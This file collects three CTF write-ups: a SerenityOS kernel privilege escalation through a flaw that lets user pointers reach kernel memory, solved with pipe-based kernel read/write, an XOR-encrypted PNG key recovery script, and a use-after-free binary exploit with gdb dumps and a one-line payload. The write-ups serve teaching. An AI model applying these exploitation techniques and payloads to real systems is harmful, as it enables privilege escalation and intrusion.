<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-fire30
description: CTF writeups and security challenges by Fire30.
---

# Writeups by Fire30

Source repository: `/repos/Fire30`

## Repository Index

- CTF-WRITEUPS/TUCTF/crypto/magic-image.md
- CTF-WRITEUPS/TUCTF/pwn/woO2.md
- CTF-WRITEUPS/36c3_ctf/wisdom/README.md

## Writeup Content


### File: CTF-WRITEUPS/36c3_ctf/wisdom/README.md

Challenge
=============
For this challenge we are given a remote shell on a machine running
[SerenityOS](https://github.com/SerenityOS/serenity/) and the flag is contained in the
block device /dev/hdb.

I figured that we would need to escalate privileges to read the flag so I
went searching for a suitable bug.

Bug
=============
SerenityOS does validation of pointers passed as syscall arguments
using the `Process::validate_(read|write)` functions.

```c++
ssize_t Process::sys$read(int fd, u8* buffer, ssize_t size)
{
    if (size < 0)
        return -EINVAL;
    if (size == 0)
        return 0;
    if (!validate_write(buffer, size))
        return -EFAULT;
     ...
    return description->read(buffer, size);
}
```
For example the code above shows how the read syscall does validation.

```c++
bool Process::validate_write(void* address, ssize_t size) const
{
    ASSERT(size >= 0);
    VirtualAddress first_address((u32)address);
    VirtualAddress last_address = first_address.offset(size - 1);
    if (is_ring0()) {
        ....
    }
    if (!size)
        return false;
    if (first_address.page_base() != last_address.page_base()) {
        if (!MM.validate_user_write(*this, last_address))
            return false;
    }
    return MM.validate_user_write(*this, last_address);                     [0]
}


bool MemoryManager::validate_user_write(const Process& process, VirtualAddress vaddr) const
 {
      auto* region = region_from_vaddr(process, vaddr);                                         [1]
      return region && region->is_writable();                                                               [2]
}
```
The real verification however is done in the  `MemoryManager::validate_user_(read|write)`
functions which are called from Process::validate(read|write) [0].
 `MemoryManager::validate_user_(read|write)` simply gets the region associated with the
 passed vaddr[1] and makes sure it is readable/writeable[2].

 ```c++
 Region* MemoryManager::region_from_vaddr(Process& process, VirtualAddress vaddr)
{
    if (auto* region = kernel_region_from_vaddr(vaddr))                                         [0]
        return region;
    return user_region_from_vaddr(process, vaddr);
}
```

Looking at region_from_vaddr we notice something that seems odd. Even though we
are supposed to be verifying a user pointer, it uses the function
`MemoryManager::kernel_region_from_vaddr` to find the region[0].

```c++
Region* MemoryManager::kernel_region_from_vaddr(VirtualAddress vaddr)
{
    if (vaddr.get() < 0xc0000000)                                                                               [0]
        return nullptr;
    for (auto& region : MM.m_kernel_regions) {
        if (region.contains(vaddr))                                                                               
            return &region;
    }
    return nullptr;
}
```
`MemoryManager::kernel_region_from_vaddr`  make sure that the address is above
`0xc0000000`[0] and if it is it then searches for the vaddr in the kernel memory map and
returns the region associated with it.

So this means that we can pass addresses that are above 0xc0000000
and they would pass validation and be treated like userspace addresses, which gives us
many avenues to read/write kernel data.

The comment in `MemoryManager::initialize_paging` confirms that something of value
should exist above `0xc0000000`.

```c++
// FIXME: We should move everything kernel-related above the 0xc0000000 virtual mark.

// Basic physical memory map:
// 0      -> 1 MB           We're just leaving this alone for now.
// 1      -> 3 MB           Kernel image.
// (last page before 2MB)   Used by quickmap_page().
// 2 MB   -> 4 MB           kmalloc_eternal() space.
// 4 MB   -> 7 MB           kmalloc() space.
// 7 MB   -> 8 MB           Supervisor physical pages (available for allocation!)
// 8 MB   -> MAX            Userspace physical pages (available for allocation!)

// Basic virtual memory map:
// 0 -> 4 KB                Null page (so nullptr dereferences crash!)
// 4 KB -> 8 MB             Identity mapped.
// 8 MB -> 3 GB             Available to userspace.
// 3GB  -> 4 GB             Kernel-only virtual address space (>0xc0000000)                 [0]
```

Note how 0xc0000000 is the start of "kernel-only virtual address space"[0], which I
presume userspace shouldn't be able to read and write to :P.

Exploit Strategy
==============
Using pipes we can read and write kernel memory pretty easily. Psuedocode is below.

```c++
int p[2];
pipe(p);

void kread(kaddr, buf, len){
        write(p[1], kaddr, len);
        read(p[0], buf, len);
}

void kwrite(kaddr, buf, len){
        write(p[1], buf, len);
        read(p[0], kaddr, len);
}
```

We needed to determine what actually was placed above `0xc0000000`.
Luckily this was quite easy as simply reading the contents of the `dmesg` command
made it clear that kernel stacks were always in this region.

```
anon@courage:$> dmesg
...
Allocated ring0 stack @ 0xc0a69000 - 0xc0a79000
Allocated ring0 stack @ 0xc0a7a000 - 0xc0a8a000
...
Allocated ring0 stack @ 0xc0b68000 - 0xc0b78000
anon@courage:$>
```

In fact all we had to do to leak a kernel stack of a child process was to fork and then
read the last line of `/proc/dmesg` as the kernel logs the address on process creation.

Gaining code execution after obtaining a child stack base is trivial. First we put the child
asleep using the `sleep` syscall.  Then we simply read the kernel
stack until we find the return address we want to overwrite, which in our case is
`syscall_asm_entry +24`, and then overwrite it with a pointer that points to the payload
of our choice. When the child wakes up it will now jump to our payload.


Reading Flag
==============

Initially I thought that obtaining root and mounting /dev/hdb would be enough to solve
the challenge. However the flag was just a text file and not a filesystem image so it can't
be mounted. This meant that we had to read the raw block device. To do this we made the
payload call `Device::get_device` to obtain the `Device` object associated with /dev/hdb
and then called `DiskDevice::read` on this object which finally did the reading of the flag.


Building
==============
The exploit is built using the SerenityOS build system. Place `exploit.cpp` into the
`Userland/` folder and type `make exploit` for the binary to be built.



### File: CTF-WRITEUPS/TUCTF/crypto/magic-image.md


# Magic Image

For this challenge you were given two files encrypt.py and encrypted.png. Presumably encrypted.png was generated with encrypt.py script. Here are the contents of the encrypt.py.

```python
#!/usr/bin/env python

def xor(s1, s2):
    res = [chr(0)]*12
    for i in range(len(res)):
        q = ord(s1[i])
        d = ord(s2[i])
        k = q ^ d
        res[i] = chr(k)
    res = ''.join(res)
    return res

def add_pad(msg):
    l = 12 - len(msg)%12
    msg += chr(l)*l
    return msg

with open('flag.png') as f:
    data = f.read()

data = add_pad(data)

with open('key') as f:
    key = f.read()

enc_data = ''
for i in range(0, len(data), 12):
    enc = xor(data[i:i+12], key)
    enc_data += enc

with open('encrypted.png', 'wb') as f:
    f.write(enc_data)

```

Looking at the code we see that it simply has a twelve byte key that xors every byte of the file with, and we need to recover it to get the original png back.

The [PNG](http://www.libpng.org/pub/png/spec/1.2/PNG-Structure.html) file format has an 8 byte header of [137 80 78 71 13 10 26 10]. So we can obtain the first 8 bytes of the key by finding each byte, b, such that ```b ^ encrypted_header[i] = decrypted_header[i]```

What about the last 4 bytes however? Well looking at the add_pad function it's main job is to pad the decrypted file so that it is divisble by the key length. The way it does it is by padding it with the character value of the number of bytes that need to be added. This is easily reversible though. If it padded over four bytes than that means we will have the key and the encrpyted value. So all we need to do is figure out the pad length. This is done by finding the value such that ```key[i] ^ i == last[i]``` where last is the last 12 bytes of the encrypted file. It turns out that the pad length is seven in this case.

We just use that formula for last four bytes of the key replacing i with the padlength ```key[i] ^ pad_length == last[i]```. Now we will have the full key and can reverse the whole image by running the encryption algorithm on itself.

Here is the full code used to solve it.

```python
#!/usr/bin/env python

def xor(s1, s2):
    res = [chr(0)]*12
    for i in range(len(res)):
        q = ord(s1[i])
        d = ord(s2[i])
        k = q ^ d
        res[i] = chr(k)
    res = ''.join(res)
    return res

# PNG header values
ords = [137, 80, 78, 71, 13, 10, 26, 10]

# Read the whole encrypted file
# and get the first 8 and last 12 bytes for later use
with open('encrypted.png') as f:
    r = f.read()
    enc_ords = r[:8]
    enc_ords = [ord(x) for x in enc_ords]
    last = r[len(r) - 12:]
    last = [ord(x) for x in last]


# Get the first eight bytes of the key
key = []
for i in range(0,len(ords)):
    for x in range(255):
        if ords[i] ^ x == enc_ords[i]:
            key.append(x)
            break

# Get the pad length and value
for x in range(1,8):
    if key[x] ^ x == last[x]:
        pad = x

# Get the last four bytes of the key
for i in range(8,12):
    for x in range(255):
        if x ^ pad == last[i]:
            key.append(x)

# Put the key into a string
key = ''.join([chr(x) for x in key])

# decrypt the file
enc_data = ''
for i in range(0, len(r), 12):
    enc = xor(r[i:i+12], key)
    enc_data += enc

# write the decrypted image out
with open('decrypt.png', 'wb') as f:
    f.write(enc_data)

```

And here is the decrypted image file with the flag

![Flag Image](https://i.imgur.com/JdSTCUz.png) 



### File: CTF-WRITEUPS/TUCTF/pwn/woO2.md

# WoO2-fixed (and WoO2 and WoO)

So this challenge was interesting because it was the first UAF bug that I have ever exploited. Luckily it was a pretty simple one. I also used the UAF bug for the WoO when I believe the goal was to use a heap overflow (oops!). So my one solution ended up working for both challenges.

For this challenge you were just given a binary and told to get the flag. I started off by running the binary and it appears to be a simple program that lets you create and delete differnent types of pets with user inputted name. When I see programs like this I generally button smash and see if I get anything interesting. Luckily I noticed that if you created a two bears, then deleted the first one multiple times, it would eventually segfault with a double free. This made me think that a UAF would be the way to go. Here is a sample run through that would cause the segfault.

```
./503b8ee65d7e768e81ee95b7ce14b2a903abb5c7
Welcome! I don't think we're in Kansas anymore.
We're about to head off on an adventure!
Select some animals you want to bring along.

Menu Options:
1: Bring a lion
2: Bring a tiger
3: Bring a bear
4: Delete Animal
5: Exit

Enter your choice:
3
Choose the type of bear you want:
1: Black Bear
2: Brown Bear
2
Enter the bear's name:
AAAAA
Menu Options:
1: Bring a lion
2: Bring a tiger
3: Bring a bear
4: Delete Animal
5: Exit

Enter your choice:
3
Choose the type of bear you want:
1: Black Bear
2: Brown Bear
2
Enter the bear's name:
b
Menu Options:
1: Bring a lion
2: Bring a tiger
3: Bring a bear
4: Delete Animal
5: Exit

Enter your choice:
4
Choose your friends wisely..
Which element do you want to delete?
1
Menu Options:
1: Bring a lion
2: Bring a tiger
3: Bring a bear
4: Delete Animal
5: Exit

Enter your choice:
4
Choose your friends wisely..
Which element do you want to delete?
1
*** Error in `./503b8ee65d7e768e81ee95b7ce14b2a903abb5c7': double free or corruption (fasttop): 0x0000000000c24850 ***
======= Backtrace: =========
/usr/lib/libc.so.6(+0x6f364)[0x7f9d3b134364]
/usr/lib/libc.so.6(+0x74d96)[0x7f9d3b139d96]
/usr/lib/libc.so.6(+0x7557e)[0x7f9d3b13a57e]
./503b8ee65d7e768e81ee95b7ce14b2a903abb5c7[0x400da5]
./503b8ee65d7e768e81ee95b7ce14b2a903abb5c7[0x400e3d]
./503b8ee65d7e768e81ee95b7ce14b2a903abb5c7[0x400f30]
/usr/lib/libc.so.6(__libc_start_main+0xf0)[0x7f9d3b0e5710]
./503b8ee65d7e768e81ee95b7ce14b2a903abb5c7[0x400849]
======= Memory map: ========
00400000-00402000 r-xp 00000000 08:03 16124030                           /home/tj/Downloads/503b8ee65d7e768e81ee95b7ce14b2a903abb5c7
00601000-00602000 r--p 00001000 08:03 16124030                           /home/tj/Downloads/503b8ee65d7e768e81ee95b7ce14b2a903abb5c7
00602000-00603000 rw-p 00002000 08:03 16124030                           /home/tj/Downloads/503b8ee65d7e768e81ee95b7ce14b2a903abb5c7
00c24000-00c45000 rw-p 00000000 00:00 0                                  [heap]
7f9d34000000-7f9d34021000 rw-p 00000000 00:00 0 
7f9d34021000-7f9d38000000 ---p 00000000 00:00 0 
7f9d3aeaf000-7f9d3aec5000 r-xp 00000000 08:11 527841                     /usr/lib/libgcc_s.so.1
7f9d3aec5000-7f9d3b0c4000 ---p 00016000 08:11 527841                     /usr/lib/libgcc_s.so.1
7f9d3b0c4000-7f9d3b0c5000 rw-p 00015000 08:11 527841                     /usr/lib/libgcc_s.so.1
7f9d3b0c5000-7f9d3b25d000 r-xp 00000000 08:11 527510                     /usr/lib/libc-2.23.so
7f9d3b25d000-7f9d3b45c000 ---p 00198000 08:11 527510                     /usr/lib/libc-2.23.so
7f9d3b45c000-7f9d3b460000 r--p 00197000 08:11 527510                     /usr/lib/libc-2.23.so
7f9d3b460000-7f9d3b462000 rw-p 0019b000 08:11 527510                     /usr/lib/libc-2.23.so
7f9d3b462000-7f9d3b466000 rw-p 00000000 00:00 0 
7f9d3b466000-7f9d3b489000 r-xp 00000000 08:11 527509                     /usr/lib/ld-2.23.so
7f9d3b664000-7f9d3b667000 rw-p 00000000 00:00 0 
7f9d3b688000-7f9d3b689000 rw-p 00000000 00:00 0 
7f9d3b689000-7f9d3b68a000 r--p 00023000 08:11 527509                     /usr/lib/ld-2.23.so
7f9d3b68a000-7f9d3b68b000 rw-p 00024000 08:11 527509                     /usr/lib/ld-2.23.so
7f9d3b68b000-7f9d3b68c000 rw-p 00000000 00:00 0 
7ffeab176000-7ffeab197000 rw-p 00000000 00:00 0                          [stack]
7ffeab1e5000-7ffeab1e8000 r--p 00000000 00:00 0                          [vvar]
7ffeab1e8000-7ffeab1ea000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
[1]    4785 abort (core dumped)  ./503b8ee65d7e768e81ee95b7ce14b2a903abb5c7
```

Knowing this I decided to next to analyze the binary in IDA. Looking at the binary in IDA there was a makeStuff function that would did all the parsing of the input.

```c
int makeStuff()
{
  int result; // eax@10
  unsigned int v1; // [sp+Ch] [bp-4h]@1

  puts("Enter your choice:");
  fflush(stdout);
  __isoc99_scanf("%d", &v1);
  getchar();
  if ( v1 == 3 )
  {
    result = makeBear();
  }
  else if ( (signed int)v1 > 3 )
  {
    if ( v1 == 5 )
      exit(0);
    if ( (signed int)v1 >= 5 )
    {
      if ( v1 == 4919 )
        pwnMe();
LABEL_16:
      printf("Invalid choice :(   %d\n", v1);
      exit(0);
    }
    result = deleteAnimal();
  }
  else if ( v1 == 1 )
  {
    result = makeLion();
  }
  else
  {
    if ( v1 != 2 )
      goto LABEL_16;
    result = makeTiger();
  }
  return result;
}
```

 Interestingly enough if you enter 4919 it will go a function called pwnMe. 
 
 ```
 void __noreturn pwnMe()
{
  __int64 v0; // [sp+0h] [bp-10h]@2

  if ( bearOffset != -1 )
  {
    v0 = (__int64)*(&pointers + bearOffset);
    if ( *(_DWORD *)(v0 + 20) == 3 )
      (*(void (**)(void))v0)();
    exit(0);
  }
  exit(0);
}
 ```
 
 So looking at that it basically checks if a value is equal to three and then executes code in a buffer. I figured the goal was to get our own input in that buffer.  
 
 That was all that static analysis that really needed to be done, it was now time to look at it in GDB.
 
I deciced to set a breakpoint at the pwnMe function and then create a bear with a name of "AAA" and enter in 4919 so the it will get called. I stepped through until it loaded the *pointers* variable in rax and then dumped the memory to see if  anything was noticeable. 

```
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000000000603830  RBX: 0x0000000000000000  RBP: 0x00007FFFFFFFE8C0  RSP: 0x00007FFFFFFFE8B0  o d I t s z A p C 
  RDI: 0x00007FFFF7DD38C0  RSI: 0x000000000000000A  RDX: 0x00007FFFF7DD5770  RCX: 0x0000000000000010  RIP: 0x0000000000400D04
  R8 : 0x00007FFFF7FD3700  R9 : 0x0000000000000000  R10: 0x1999999999999999  R11: 0x000000000000000A  R12: 0x0000000000400820
  R13: 0x00007FFFFFFFE9E0  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400d04 <pwnMe+35>:	mov    QWORD PTR [rbp-0x10],rax
   0x400d08 <pwnMe+39>:	mov    rax,QWORD PTR [rbp-0x10]
   0x400d0c <pwnMe+43>:	mov    eax,DWORD PTR [rax+0x14]
   0x400d0f <pwnMe+46>:	cmp    eax,0x3
   0x400d12 <pwnMe+49>:	jne    0x400d31 <pwnMe+80>
   0x400d14 <pwnMe+51>:	jmp    0x400d20 <pwnMe+63>
   0x400d16 <pwnMe+53>:	mov    edi,0x0
   0x400d1b <pwnMe+58>:	call   0x400810 <exit@plt>
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400d04 in pwnMe ()
gdb$ hexdump 603830
0x0000000000603830 : EF BE AD DE 00 00 00 00 - 41 41 41 0A 00 00 00 00 ........AAA.....
```

Yay we can put values somewhat close to where we need. However if we were able to get the ```*(_DWORD * )(v0 + 20) == 3 ``` check to pass it would try to execute code at 0xdeadbeef, so we still have work to do. 

I did the same thing again except I created two bears. When I dummped the memory interestingly only the second bear was in memory. 

```
gdb$ hexdump $rax 2
0x0000000000603850 : EF BE AD DE 00 00 00 00 - 44 44 44 44 0A 00 00 00 ........DDDD....
0x0000000000603860 : 00 00 00 00 02 00 00 00 - A1 07 02 00 00 00 00 00 ................
```

This got me thinking... What if I created two bears, deleted the first one, and then created another object, say a tiger.  What would the memory layout look like? Well it turns out it is exactly what we needed. 

```
gdb$ hexdump $rax 2
0x0000000000603850 : 45 45 45 45 0A 00 00 00 - 42 42 42 42 0A 00 00 00 EEEE....BBBB....
0x0000000000603860 : 00 00 00 00 04 00 00 00 - A1 07 02 00 00 00 00 00 ................
```

We can now put our own input into the address that is getting executed  in pwnMe, however we still need to make it pass the check where ```[rax + 20] = 3```. Well what is in ```[rax + 20]``` currently?

```
gdb$ p *($rax + 0x14)
$5 = 0x4
```

It turns out that I created a Caspain Tiger which was the fourth choice. If I switch it to a Sumatarian Tiger, which is the third choice, it then becomes 0x3 which is what we need. 

So putting this all together: We create two bears, delete the first, create a Sumatarian Tiger and then enter in 4919, and then we should have our own code executing. So lets try it out, and see what gdb says.

```
Program received signal SIGSEGV, Segmentation fault.
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000000A45454545  RBX: 0x0000000000000000  RBP: 0x00007FFFFFFFE8C0  RSP: 0x00007FFFFFFFE8A8  o d I t s Z a P c 
  RDI: 0x00007FFFF7DD38C0  RSI: 0x000000000000000A  RDX: 0x00007FFFF7DD5770  RCX: 0x0000000000000010  RIP: 0x0000000A45454545
  R8 : 0x00007FFFF7FD3700  R9 : 0x0000000000000000  R10: 0x1999999999999999  R11: 0x000000000000000A  R12: 0x0000000000400820
  R13: 0x00007FFFFFFFE9E0  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				Error while running hook_stop:
Cannot access memory at address 0xa45454545
0x0000000a45454545 in ?? ()
gdb$ 

```

Success!

Looking back in IDA it turns out that 0x40090D there is a function called *l33tH4x0r* which reads from flag.txt and prints it to stdout. So we just need to put the name of the caspian tiger as the address to *l33tH4x0r* and it will be executed. 

Here is my full solution(Sorry for the long command lol):
```
python2 -c "print '3\n1\na\n3\n1\nb\n4\n1\n2\n3\n' + '\x0D\x09\x40\x00\x00\x00\x00\x00' + '\n4919\n'" | ./503b8ee65d7e768e81ee95b7ce14b2a903abb5c7
```

When I run my solution the end of the output Note that I did not remember the flag so I just made one up to prove it works.

```
...
Enter your choice:
TUCTF{I_FORGOT_THE_FLAG}
```



